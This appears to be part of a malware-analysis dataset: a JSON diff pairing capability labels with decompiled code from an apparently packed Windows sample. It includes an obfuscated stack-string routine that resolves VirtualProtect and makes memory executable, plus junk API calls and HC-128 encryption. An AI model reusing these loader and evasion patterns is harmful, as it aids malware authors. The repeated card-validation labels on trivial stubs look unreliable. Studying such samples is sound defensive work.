(*_sym.imp.KERNEL32.dll_GetConsoleMode)(0, 0);\n        (*_sym.imp.KERNEL32.dll_CopyFileExA)(\"ducikimem\", \"xabeduniperiwabuyehodabetewapero\", 0, 0, 0, 0);\n    }\n    return 0;\n}\n",
+        "token_count": 1922
+    },
+    "0041bf00": {
+        "rules": [
+            "encrypt data using HC-128/1d01b23c04404fe18b84a06c7e7d83b0",
+            "hash data using aphash/10489b186fc44711a1078750698db7a9"
+        ],
+        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_830h\n\nvoid __cdecl fcn.0041bf00(int32_t arg_8h, uint32_t arg_ch, uint arg_10h)\n\n{\n    int32_t var_830h;\n    uint var_430h;\n    uint var_42ch;\n    uint var_428h;\n    uint var_424h;\n    uint var_420h;\n    uint var_41ch;\n    uint var_418h;\n    uint var_14h;\n    uint32_t var_10h;\n    uint32_t var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    var_4h = arg_8h;\n    if (*0x27c852c == 0x516) {\n        var_14h = 0;\n        (*_sym.imp.KERNEL32.dll_ReadConsoleOutputCharacterA)(0, &var_418h, 0, 0, &var_41ch);\n    }\n    var_ch = arg_ch >> 3;\n    for (var_8h = 0; var_8h < var_ch; var_8h = var_8h + 1) {\n        if (*0x27c852c == 0x29) {\n            (*_sym.imp.KERNEL32.dll_CopyFileW)(L\"sokozomujaz\", L\"mesoyigezusivi\", 0);\n            (*_sym.imp.KERNEL32.dll_DeleteFileA)(\"wivomomenutoruyeselexe\");\n        }\n        var_10h = var_8h;\n        if (*0x27c852c == 0xe1b) {\n            (*_sym.imp.KERNEL32.dll_GetPriorityClass)(0);\n            (*_sym.imp.KERNEL32.dll_ResetEvent)(0);\n        }\n        var_10h = var_10h << 1;\n        if (*0x27c852c == 0x1c) {\n            (*_sym.imp.KERNEL32.dll_GetPrivateProfileStringA)\n                      (\"jixolosokunexedonupigey\", \"wobujetivorinubihugoyabu\", \"xavexefimaroyizociwofipevuxok\", &var_830h\n                       , 0, \"liyubomamenideru\");\n            (*_sym.imp.KERNEL32.dll_WriteFile)(0, 0, 0, 0, 0);\n        }\n        var_830h = var_4h + var_10h * 4;\n        fcn.0041bd00(var_830h, arg_10h);\n    }\n    return;\n}\n",
+        "token_count": 578
+    },
+    "0040198a": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.0040198a(void)\n\n{\n    fcn.00407eb0(4);\n    return;\n}\n",
+        "token_count": 27
+    },
+    "004019e0": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid __fastcall fcn.004019e0(code **param_1)\n\n{\n    uint var_4h;\n    \n    *param_1 = vtable.type_info.0;\n    fcn.00407ed0(param_1);\n    return;\n}\n",
+        "token_count": 55
+    },
+    "004021b0": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.004021b0(void)\n\n{\n    fcn.00407eb0(4);\n    return;\n}\n",
+        "token_count": 27
+    },
+    "00402372": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.00402372(void)\n\n{\n    fcn.00407eb0(4);\n    return;\n}\n",
+        "token_count": 26
+    },
+    "00402a01": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.00402a01(void)\n\n{\n    fcn.00407eb0(4);\n    return;\n}\n",
+        "token_count": 27
+    },
+    "004030c6": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.004030c6(void)\n\n{\n    fcn.00407eb0(4);\n    return;\n}\n",
+        "token_count": 27
+    },
+    "00403565": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.00403565(void)\n\n{\n    fcn.00407eb0(4);\n    return;\n}\n",
+        "token_count": 26
+    },
+    "004036c6": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.004036c6(void)\n\n{\n    fcn.00407eb0(4);\n    return;\n}\n",
+        "token_count": 27
+    },
+    "0040399b": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.0040399b(void)\n\n{\n    fcn.00407eb0(4);\n    return;\n}\n",
+        "token_count": 27
+    },
+    "00403cca": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.00403cca(void)\n\n{\n    fcn.00407eb0(4);\n    return;\n}\n",
+        "token_count": 26
+    },
+    "00404250": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid __cdecl fcn.00404250(uint arg_8h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    \n    puVar1 = fcn.00404330();\n    *puVar1 = arg_8h;\n    uVar2 = fcn.00404280(arg_8h);\n    puVar1 = fcn.00404300();\n    *puVar1 = uVar2;\n    return;\n}\n",
+        "token_count": 96
+    },
+    "004048d1": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.004048d1(void)\n\n{\n    fcn.00407eb0(0xd);\n    return;\n}\n",
+        "token_count": 28
+    },
+    "00404b4e": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.00404b4e(void)\n\n{\n    fcn.00407eb0(0xd);\n    return;\n}\n",
+        "token_count": 29
+    },
+    "00405a98": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.00405a98(void)\n\n{\n    fcn.00407eb0(0xc);\n    return;\n}\n",
+        "token_count": 28
+    },
+    "00405bd4": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.00405bd4(void)\n\n{\n    fcn.00407eb0(0xc);\n    return;\n}\n",
+        "token_count": 28
+    },
+    "00406140": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.00406140(void)\n\n{\n    fcn.00407eb0(0xd);\n    return;\n}\n",
+        "token_count": 27
+    },
+    "00406196": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.00406196(void)\n\n{\n    fcn.00407eb0(0xc);\n    return;\n}\n",
+        "token_count": 27
+    },
+    "00406418": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.00406418(void)\n\n{\n    fcn.00407eb0(0xd);\n    return;\n}\n",
+        "token_count": 27
+    },
+    "00406485": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.00406485(void)\n\n{\n    fcn.00407eb0(0xc);\n    return;\n}\n",
+        "token_count": 27
+    },
+    "00407870": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.00407870(void)\n\n{\n    fcn.00407e70(8);\n    return;\n}\n",
+        "token_count": 26
+    },
+    "00407e46": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.00407e46(void)\n\n{\n    fcn.00407eb0(10);\n    return;\n}\n",
+        "token_count": 27
+    },
+    "00407fbb": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.00407fbb(void)\n\n{\n    fcn.00407eb0(0xe);\n    return;\n}\n",
+        "token_count": 28
+    },
+    "004091e0": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x004091f1)\n// WARNING: Removing unreachable block (ram,0x004091f7)\n// WARNING: Removing unreachable block (ram,0x004091f9)\n\nvoid fcn.004091e0(void)\n\n{\n    return;\n}\n",
+        "token_count": 64
+    },
+    "00409692": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.00409692(void)\n\n{\n    fcn.00407eb0(4);\n    return;\n}\n",
+        "token_count": 26
+    },
+    "00409dce": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.00409dce(void)\n\n{\n    fcn.00407eb0(4);\n    return;\n}\n",
+        "token_count": 27
+    },
+    "0040a158": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.0040a158(void)\n\n{\n    fcn.00407eb0(4);\n    return;\n}\n",
+        "token_count": 27
+    },
+    "0040a3b5": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.0040a3b5(void)\n\n{\n    fcn.00407eb0(4);\n    return;\n}\n",
+        "token_count": 29
+    },
+    "0040a4c1": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.0040a4c1(void)\n\n{\n    fcn.00407eb0(4);\n    return;\n}\n",
+        "token_count": 29
+    },
+    "0040cd75": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.0040cd75(void)\n\n{\n    fcn.00407eb0(0xf);\n    return;\n}\n",
+        "token_count": 28
+    },
+    "0040d58a": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.0040d58a(void)\n\n{\n    fcn.00407eb0(0xf);\n    return;\n}\n",
+        "token_count": 29
+    },
+    "0040dbf0": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.0040dbf0(void)\n\n{\n    fcn.00405cf0(*0x863770);\n    return;\n}\n",
+        "token_count": 31
+    },
+    "00415784": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid __cdecl fcn.00415784(uint arg_8h)\n\n{\n    int32_t unaff_EBP;\n    \n    fcn.00419d10(*(unaff_EBP + 8));\n    return;\n}\n",
+        "token_count": 48
+    },
+    "00415a9f": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid __cdecl fcn.00415a9f(uint arg_8h)\n\n{\n    int32_t unaff_EBP;\n    \n    fcn.00419d10(*(unaff_EBP + 8));\n    return;\n}\n",
+        "token_count": 50
+    },
+    "00419cc1": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.00419cc1(void)\n\n{\n    fcn.00407eb0(10);\n    return;\n}\n",
+        "token_count": 27
+    },
+    "0041a008": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.0041a008(void)\n\n{\n    fcn.00407eb0(1);\n    return;\n}\n",
+        "token_count": 27
+    },
+    "0041a150": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.0041a150(void)\n\n{\n    fcn.0041a170(1);\n    return;\n}\n",
+        "token_count": 27
+    },
+    "0041a2b7": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.0041a2b7(void)\n\n{\n    int32_t unaff_EBP;\n    uint var_20h;\n    \n    fcn.00416a40(*(unaff_EBP + -0x20), *(*0x27c8c30 + *(unaff_EBP + -0x20) * 4));\n    return;\n}\n",
+        "token_count": 78
+    },
+    "0041a2e4": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.0041a2e4(void)\n\n{\n    fcn.00407eb0(1);\n    return;\n}\n",
+        "token_count": 29
+    },
+    "0041a761": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid __cdecl fcn.0041a761(uint arg_8h)\n\n{\n    int32_t unaff_EBP;\n    \n    fcn.004169e0(*(unaff_EBP + 8));\n    return;\n}\n",
+        "token_count": 49
+    },
+    "0041aa85": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid __cdecl fcn.0041aa85(uint arg_8h)\n\n{\n    int32_t unaff_EBP;\n    \n    fcn.00419d10(*(unaff_EBP + 8));\n    return;\n}\n",
+        "token_count": 49
+    },
+    "0041ac9c": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid __cdecl fcn.0041ac9c(uint arg_8h)\n\n{\n    int32_t unaff_EBP;\n    \n    fcn.00419d10(*(unaff_EBP + 8));\n    return;\n}\n",
+        "token_count": 50
+    },
+    "0041af20": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
+            "contain obfuscated stackstrings",
+            "link function at runtime on Windows"
+        ],
+        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_2b0h\n// WARNING: Variable defined which should be unmapped: var_2ach\n// WARNING: Variable defined which should be unmapped: var_2a8h\n// WARNING: Variable defined which should be unmapped: var_2a4h\n// WARNING: Variable defined which should be unmapped: var_2a0h\n// WARNING: Variable defined which should be unmapped: var_29ch\n// WARNING: Variable defined which should be unmapped: var_298h\n// WARNING: Variable defined which should be unmapped: var_294h\n// WARNING: Variable defined which should be unmapped: var_290h\n// WARNING: Variable defined which should be unmapped: var_28ch\n// WARNING: Variable defined which should be unmapped: var_288h\n// WARNING: Variable defined which should be unmapped: var_284h\n// WARNING: Variable defined which should be unmapped: var_280h\n// WARNING: Variable defined which should be unmapped: var_27ch\n// WARNING: Variable defined which should be unmapped: var_278h\n// WARNING: Variable defined which should be unmapped: var_274h\n// WARNING: Variable defined which should be unmapped: var_270h\n// WARNING: Variable defined which should be unmapped: var_26ch\n// WARNING: Variable defined which should be unmapped: var_268h\n// WARNING: Variable defined which should be unmapped: var_264h\n// WARNING: Variable defined which should be unmapped: var_260h\n// WARNING: Variable defined which should be unmapped: var_25ch\n// WARNING: Variable defined which should be unmapped: var_258h\n// WARNING: Variable defined which should be unmapped: var_254h\n// WARNING: Variable defined which should be unmapped: var_250h\n// WARNING: Variable defined which should be unmapped: var_24ch\n// WARNING: Variable defined which should be unmapped: var_248h\n// WARNING: Variable defined which should be unmapped: var_244h\n// WARNING: Variable defined which should be unmapped: var_240h\n// WARNING: Variable defined which should be unmapped: var_23ch\n// WARNING: Variable defined which should be unmapped: var_238h\n// WARNING: Variable defined which should be unmapped: var_234h\n// WARNING: Variable defined which should be unmapped: var_230h\n// WARNING: Variable defined which should be unmapped: var_22ch\n// WARNING: Variable defined which should be unmapped: var_228h\n// WARNING: Variable defined which should be unmapped: var_224h\n// WARNING: Variable defined which should be unmapped: var_220h\n// WARNING: Variable defined which should be unmapped: var_21ch\n// WARNING: Variable defined which should be unmapped: var_218h\n// WARNING: Variable defined which should be unmapped: var_214h\n// WARNING: Variable defined which should be unmapped: var_210h\n// WARNING: Variable defined which should be unmapped: var_20ch\n// WARNING: Variable defined which should be unmapped: var_208h\n// WARNING: Variable defined which should be unmapped: var_204h\n// WARNING: Variable defined which should be unmapped: var_200h\n// WARNING: Variable defined which should be unmapped: var_1fch\n// WARNING: Variable defined which should be unmapped: var_1f8h\n// WARNING: Variable defined which should be unmapped: var_1f4h\n// WARNING: Variable defined which should be unmapped: var_1f0h\n// WARNING: Variable defined which should be unmapped: var_1ech\n// WARNING: Variable defined which should be unmapped: var_1e8h\n// WARNING: Variable defined which should be unmapped: var_1e4h\n// WARNING: Variable defined which should be unmapped: var_1e0h\n// WARNING: Variable defined which should be unmapped: var_1dch\n// WARNING: Variable defined which should be unmapped: var_1d8h\n// WARNING: Variable defined which should be unmapped: var_1d4h\n// WARNING: Variable defined which should be unmapped: var_1d0h\n// WARNING: Variable defined which should be unmapped: var_1cch\n// WARNING: Variable defined which should be unmapped: var_1c8h\n// WARNING: Variable defined which should be unmapped: var_1c4h\n// WARNING: Variable defined which should be unmapped: var_1c0h\n// WARNING: Variable defined which should be unmapped: var_1bch\n// WARNING: Variable defined which should be unmapped: var_1b8h\n// WARNING: Variable defined which should be unmapped: var_1b4h\n// WARNING: Variable defined which should be unmapped: var_1b0h\n// WARNING: Variable defined which should be unmapped: var_1ach\n// WARNING: Variable defined which should be unmapped: var_1a8h\n// WARNING: Variable defined which should be unmapped: var_1a4h\n// WARNING: Variable defined which should be unmapped: var_1a0h\n// WARNING: Variable defined which should be unmapped: var_19ch\n// WARNING: Variable defined which should be unmapped: var_198h\n// WARNING: Variable defined which should be unmapped: var_194h\n// WARNING: Variable defined which should be unmapped: var_190h\n// WARNING: Variable defined which should be unmapped: var_18ch\n// WARNING: Variable defined which should be unmapped: var_188h\n// WARNING: Variable defined which should be unmapped: var_184h\n// WARNING: Variable defined which should be unmapped: var_180h\n// WARNING: Variable defined which should be unmapped: var_17ch\n// WARNING: Variable defined which should be unmapped: var_178h\n// WARNING: Variable defined which should be unmapped: var_174h\n// WARNING: Variable defined which should be unmapped: var_170h\n// WARNING: Variable defined which should be unmapped: var_16ch\n// WARNING: Variable defined which should be unmapped: var_168h\n// WARNING: Variable defined which should be unmapped: var_164h\n// WARNING: Variable defined which should be unmapped: var_160h\n// WARNING: Variable defined which should be unmapped: var_15ch\n// WARNING: Variable defined which should be unmapped: var_158h\n// WARNING: Variable defined which should be unmapped: var_154h\n// WARNING: Variable defined which should be unmapped: var_150h\n// WARNING: Variable defined which should be unmapped: var_14ch\n// WARNING: Variable defined which should be unmapped: var_148h\n// WARNING: Variable defined which should be unmapped: var_144h\n// WARNING: Variable defined which should be unmapped: var_140h\n// WARNING: Variable defined which should be unmapped: var_13ch\n// WARNING: Variable defined which should be unmapped: var_138h\n// WARNING: Variable defined which should be unmapped: var_134h\n// WARNING: Variable defined which should be unmapped: var_130h\n// WARNING: Variable defined which should be unmapped: var_12ch\n// WARNING: Variable defined which should be unmapped: var_128h\n// WARNING: Variable defined which should be unmapped: var_124h\n// WARNING: Variable defined which should be unmapped: var_120h\n// WARNING: Variable defined which should be unmapped: var_11ch\n// WARNING: Variable defined which should be unmapped: var_118h\n// WARNING: Variable defined which should be unmapped: var_114h\n// WARNING: Variable defined which should be unmapped: var_110h\n// WARNING: Variable defined which should be unmapped: var_10ch\n// WARNING: Variable defined which should be unmapped: var_108h\n// WARNING: Variable defined which should be unmapped: var_104h\n// WARNING: Variable defined which should be unmapped: var_100h\n// WARNING: Variable defined which should be unmapped: var_fch\n// WARNING: Variable defined which should be unmapped: var_f8h\n// WARNING: Variable defined which should be unmapped: var_f4h\n// WARNING: Variable defined which should be unmapped: var_f0h\n// WARNING: Variable defined which should be unmapped: var_ech\n// WARNING: Variable defined which should be unmapped: var_e8h\n// WARNING: Variable defined which should be unmapped: var_e4h\n// WARNING: Variable defined which should be unmapped: var_e0h\n// WARNING: Variable defined which should be unmapped: var_dch\n// WARNING: Variable defined which should be unmapped: var_d8h\n// WARNING: Variable defined which should be unmapped: var_d4h\n// WARNING: Variable defined which should be unmapped: var_d0h\n// WARNING: Variable defined which should be unmapped: var_cch\n\nvoid fcn.0041af20(void)\n\n{\n    char *pcVar1;\n    uint var_2b0h;\n    uint var_2ach;\n    uint var_2a8h;\n    uint var_2a4h;\n    uint var_2a0h;\n    uint var_29ch;\n    uint var_298h;\n    uint var_294h;\n    uint var_290h;\n    uint var_28ch;\n    uint var_288h;\n    uint var_284h;\n    uint var_280h;\n    uint var_27ch;\n    uint var_278h;\n    uint var_274h;\n    uint var_270h;\n    uint var_26ch;\n    uint var_268h;\n    uint var_264h;\n    uint var_260h;\n    uint var_25ch;\n    uint var_258h;\n    uint var_254h;\n    uint var_250h;\n    uint var_24ch;\n    uint var_248h;\n    uint var_244h;\n    uint var_240h;\n    uint var_23ch;\n    uint var_238h;\n    uint var_234h;\n    uint var_230h;\n    uint var_22ch;\n    uint var_228h;\n    uint var_224h;\n    uint var_220h;\n    uint var_21ch;\n    uint var_218h;\n    uint var_214h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uint var_200h;\n    uint var_1fch;\n    uint var_1f8h;\n    uint var_1f4h;\n    uint var_1f0h;\n    uint var_1ech;\n    uint var_1e8h;\n    uint var_1e4h;\n    uint var_1e0h;\n    uint var_1dch;\n    uint var_1d8h;\n    uint var_1d4h;\n    uint var_1d0h;\n    uint var_1cch;\n    uint var_1c8h;\n    uint var_1c4h;\n    uint var_1c0h;\n    uint var_1bch;\n    uint var_1b8h;\n    uint var_1b4h;\n    uint var_1b0h;\n    uint var_1ach;\n    uint var_1a8h;\n    uint var_1a4h;\n    uint var_1a0h;\n    uint var_19ch;\n    uint var_198h;\n    uint var_194h;\n    uint var_190h;\n    uint var_18ch;\n    uint var_188h;\n    uint var_184h;\n    uint var_180h;\n    uint var_17ch;\n    uint var_178h;\n    uint var_174h;\n    uint var_170h;\n    uint var_16ch;\n    uint var_168h;\n    uint var_164h;\n    uint var_160h;\n    uint var_15ch;\n    uint var_158h;\n    uint var_154h;\n    uint var_150h;\n    uint var_14ch;\n    uint var_148h;\n    uint var_144h;\n    uint var_140h;\n    uint var_13ch;\n    uint var_138h;\n    uint var_134h;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint var_120h;\n    uint var_11ch;\n    uint var_118h;\n    uint var_114h;\n    uint var_110h;\n    uint var_10ch;\n    uint var_108h;\n    uint var_104h;\n    uint var_100h;\n    uint var_fch;\n    uint var_f8h;\n    uint var_f4h;\n    uint var_f0h;\n    uint var_ech;\n    uint var_e8h;\n    uint var_e4h;\n    uint var_e0h;\n    uint var_dch;\n    uint var_d8h;\n    uint var_d4h;\n    uint var_d0h;\n    uint var_cch;\n    uint var_c8h;\n    uint var_c4h;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint var_94h;\n    uint var_90h;\n    uint var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x863c0e = 0x6c;\n    *0x863c11 = 0x6f;\n    *0x863c09 = 0x69;\n    *0x863c08 = '`';\n    *0x863c15 = '~';\n    *0x863c12 = '~';\n    pcVar1 = \"kernel32.dll\";\n    *0x27c8528 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"kernel32.dll\");\n    *0x863c13 = 0x65;\n    *0x863c0f = 0x50;\n    *0x863c16 = 0;\n    *0x863c14 = 99;\n    *0x863c0d = 0x61;\n    *0x863c0b = 0x74;\n    *0x863c10 = 0x72;\n    *0x863c0c = 0x75;\n    *0x863c15 = *0x863c15 + -10;\n    *0x863c12 = *0x863c12 + -10;\n    *0x863c0a = 0x72;\n    *0x863c08 = *0x863c08 + -10;\n    *0x864b04 = (*_sym.imp.KERNEL32.dll_GetProcAddress)\n                          (*0x27c8528, 0x863c08, pcVar1, 0x2b4b720c, 0xff38c565, 0xe4cbd495, 0x3dc7f043, 0x1571b89e, \n                           0x2bf56dfe, 0xfb350df, 0x24521135, 0x307be79, 0x69a1a146, 0x20ad7ff0, 0x2d1b94c3, 0xec30d33c\n                           , 0x15ecfc59, 0x2b4f1db8, 0x3f2932f8, 0x1ab1b1f9, 0x6fbd6936, 0x22a3b78d, 0x33723532, \n                           0x32b1b2ef, 0x39414adc, 0x6f923a78, 0x62c849b8, 0x6af11206, 0xd2f308a, 0x6aa6ff83, 0x353e067\n                           , 0x4a29d467, 0xedbb4bd, 0x5d5ac704, 0x6e1d867c, 0xa0bea317, 0x6a50e89c, 0x4d1d7a05, \n                           0x22eeea02, 0x2ef18e6f, 0x75595e54, 0x2de8ecf2, 0x268725f4, 0x13042cba, 0x3ed55316, \n                           0x4ec54e85, 0x1c501ce6, 0x2d900e03, 0x3ae689ab, 0xea9cc5e, 0x73b1d72f, 0x4595c5d7, 0x5cf27f70\n                           , 0x49e2aab1, 0x6b56b011, 0x13113ea9, 0x2e3326cd, 0x2b57f32a, 0x774aa02b, 0x2f6a380d, \n                           0x4cda5f4a, 0xc89b0cd6, 0x5a132f3f, 0x2017f368, 0x33272a94, 0x74f9fdcb, 0x12d2ffbb, \n                           0x6cf1bc26, 0x35208d8f, 0x68b9f41f, 0x19fd6db2, 0x3f45f1fa, 0x53ca3d40, 0x3191233a, \n                           0x426c7ba6, 0x4a098b82, 0x2e3485d1, 0x5befab71, 0x61c91554, 0x32170e8c, 0x40, 0x6d7a6ff8, \n                           0x6ea795e6, 0x1735a58f, 0x34812bf9, 0x1c866c7e, 0x5c1b8590, 0x25d39dae, 0xb962a41e, \n                           0x476bffb2, 0xee681bed, 0x4055b6da, 0x10fc7254, 0x307e3647, 0x3b8a4975, 0x7008767, 0x110a7dee\n                           , 0x3630fc96, 0x1c33a82f, 0x747c849c, 0x40a44c74, 0x58b0e5b7, 0x9997cdb9, 0xa8f5774, \n                           0x691bdca9, 0x390b8ce5, 0x7595c308, 0x442abb2e, 0x4498eccc, 0x224d24cf, 0x7ae49c54, \n                           0x67608532, 0x5bc5a2b0, 0x4dce8ffe, 0xe94714ee, 0x7162d5a8, 0x13a90522, 0x45e755c8, \n                           0x5162b408, 0x3ebbbce2, 0x209fa54a, 0x15dcb498, 0x43262520, 0x2dcb9d86, 0x206b4751);\n    (**0x864b04)(*0x27c0670, *0x27c852c, 0x40, &var_4h);\n    return;\n}\n",
+        "token_count": 4709
+    },
+    "0041b940": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
+        "decompiled_code": "\nvoid fcn.0041b940(void)\n\n{\n    return;\n}\n",
+        "token_count": 16
+    },
+    "0041b960": {
+        "rules": [
+            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
+        ],
